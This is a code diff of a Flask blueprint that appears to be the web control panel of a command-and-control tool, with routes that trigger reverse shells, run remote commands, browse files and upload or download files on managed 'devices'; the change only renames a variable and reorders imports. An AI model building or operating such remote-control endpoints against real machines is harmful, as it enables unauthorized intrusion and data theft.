@@ -1,17 +1,11 @@
-from flask import (
-    Blueprint,
-    render_template,
-    jsonify,
-    flash,
-    redirect,
-    send_file,
-    request)
-from Utils.web import generate_response, authorized
-from Database import db_session, DeviceModel
 from Commander.commander import Commander
+from Database import DeviceModel, db_session
+from flask import (Blueprint, flash, jsonify, redirect, render_template,
+                   request, send_file)
+from Utils.web import authorized, generate_response
 
 
-def devices_bp(server: Commander):
+def devices_bp(commander: Commander):
     devices_bp = Blueprint("devices", __name__, url_prefix="/devices")
 
     @devices_bp.route("/", methods=["GET"])
@@ -20,7 +14,7 @@ def devices_bp(server: Commander):
         use_json = request.args.get("json", "").lower() == "true"
         devices: list[DeviceModel | None] = db_session.query(DeviceModel).all()
         if use_json:
-            return jsonify([device.to_json(server) for device in devices])
+            return jsonify([device.to_json(commander) for device in devices])
         return render_template("devices.html", devices=devices)
 
     @devices_bp.route("/reverse_shell", methods=["POST"])
@@ -35,7 +29,7 @@ def devices_bp(server: Commander):
         device_id = int(device_id)
 
         try:
-            server.get_active_handler(device_id).reverse_shell(address, port)
+            commander.get_active_handler(device_id).reverse_shell(address, port)
         except Exception as e:
             return generate_response("error", str(e), "listeners", 500)
         else:
@@ -52,7 +46,7 @@ def devices_bp(server: Commander):
         device_id = int(device_id)
 
         try:
-            output = server.get_active_handler(device_id).rce(cmd)
+            output = commander.get_active_handler(device_id).rce(cmd)
         except Exception as e:
             return generate_response("error", str(e), "listeners", 500)
         else:
@@ -67,9 +61,9 @@ def devices_bp(server: Commander):
             return generate_response("error", "Invalid ID.", "devices", 400)
         device_id = int(device_id)
 
-        output = server.get_active_handler(device_id).infos()
+        output = commander.get_active_handler(device_id).infos()
         try:
-            output = server.get_active_handler(device_id).infos()
+            output = commander.get_active_handler(device_id).infos()
         except Exception as e:
             return generate_response("error", str(e), "listeners", 500)
         else:
@@ -85,7 +79,7 @@ def devices_bp(server: Commander):
             return generate_response("error", "Invalid ID.", "devices", 400)
         device_id = int(device_id)
         try:
-            output = server.get_active_handler(
+            output = commander.get_active_handler(
                 device_id).get_directory_contents(dir)
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)})
@@ -106,7 +100,7 @@ def devices_bp(server: Commander):
         if remote_path is None:
             return generate_response("error", "Upload path is missing.", "devices", 400)
         try:
-            output = server.get_active_handler(
+            output = commander.get_active_handler(
                 device_id).file_upload(request.files.get('file'), remote_path)
         except Exception as e:
             return generate_response("error", str(e), "devices", 500)
@@ -124,7 +118,7 @@ def devices_bp(server: Commander):
         if remote_path is None:
             return generate_response("error", "File path is missing.", "devices", 400)
         try:
-            file = server.get_active_handler(
+            file = commander.get_active_handler(
                 device_id).file_download(remote_path)
         except Exception as e:
             return generate_response("error", str(e), "/devices", 500)
